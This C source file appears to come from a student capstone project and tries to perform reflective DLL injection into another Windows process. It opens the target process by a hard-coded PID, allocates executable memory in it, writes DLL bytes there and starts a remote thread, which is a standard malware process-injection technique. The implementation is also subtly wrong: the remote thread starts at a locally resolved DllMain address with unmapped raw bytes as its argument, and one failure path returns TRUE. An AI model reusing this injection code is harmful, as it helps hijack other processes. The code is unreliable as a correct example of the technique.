#include <windows.h>
#include <stdio.h>

typedef BOOL(WINAPI* ReflectiveDllMain)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

BOOL PerformReflectiveDLLInjection(DWORD dwProcessId, BYTE* pDllBuffer, DWORD dwDllSize)
{
        // 1. LOAD INTO MEMORY 
        // 2. GET WHERE IT IS LOADED 
	// 3. PROCESS TO ATTACH, PROCESS 
        // 4. MAKE SPACE IN THAT PROCESS VIA VIRTUAL ALLOC
        // 5. WRITE PROCESS MEMORY AND WRITE/COPY THE DLL CONTENTS INTO THAT SPACE
        // 6. RESUME THE WORKING OF THAT PROCESS 

    LPCSTR dllPath = "D:\\Drive\\APranav\\Capstone\\Phase2\\ReflectiveDLL\\mydll.dll";
    printf("1\n");
    HMODULE hModule = LoadLibraryA(dllPath);
    if (hModule == NULL)
    {
        printf("Failed to load the DLL.\n");
        return 1;
    }
   
    printf("2\n");
    FARPROC pLoadLibraryA = GetProcAddress(hModule, "DllMain");
    if (pLoadLibraryA == NULL)
    {
        printf("Failed to get the address of ReflectiveDllMain function.\n");
        return FALSE;
    }

    printf("3\n");
    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        printf("Failed to open the target process.\n");
        return FALSE;
    }

    printf("4\n");
    // Allocate memory in the target process for the DLL
    LPVOID pRemoteDll = VirtualAllocEx(hProcess, NULL, dwDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteDll == NULL)
    {
        printf("Failed to allocate memory in the target process.\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("5\n");
    // Write the DLL content to the allocated memory in the target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteDll, pDllBuffer, dwDllSize, &bytesWritten) || bytesWritten != dwDllSize)
    {
        printf("Failed to write the DLL to the target process memory.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }    

    printf("6\n");
    // Create a remote thread in the target process to execute the ReflectiveDllMain function
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteDll, 0, NULL);
    if (hThread == NULL)
    {
        printf("Failed to create a remote thread in the target process.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("7\n");
    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    printf("8\n");
    // Get the exit code of the remote thread
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);

    printf("9\n");
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    printf("10\n");

    return exitCode != 0;
}

int main()
{
    // Replace with the target process ID where you want to inject and execute the DLL
    DWORD dwTargetProcessId = 15444;

    // Read the custom DLL content from file
    FILE* pFile = fopen("mydll.dll", "rb");
    if (pFile == NULL)
    {
        printf("Failed to open the custom DLL file.\n");
        return 1;
    }

    fseek(pFile, 0, SEEK_END);
    long fileSize = ftell(pFile);
    fseek(pFile, 0, SEEK_SET);

    BYTE* pDllBuffer = (BYTE*)malloc(fileSize);
    if (pDllBuffer == NULL)
    {
        printf("Failed to allocate memory for DLL buffer.\n");
        fclose(pFile);
        return 1;
    }

    fread(pDllBuffer, 1, fileSize, pFile);
    fclose(pFile);

    // Perform reflective DLL injection and execution
    if (!PerformReflectiveDLLInjection(dwTargetProcessId, pDllBuffer, fileSize))
    {
        printf("Failed to perform reflective DLL injection.\n");
        free(pDllBuffer);
        return 1;
    }

    printf("Reflective DLL injection and execution succeeded.\n");

    free(pDllBuffer);
    return 0;
}
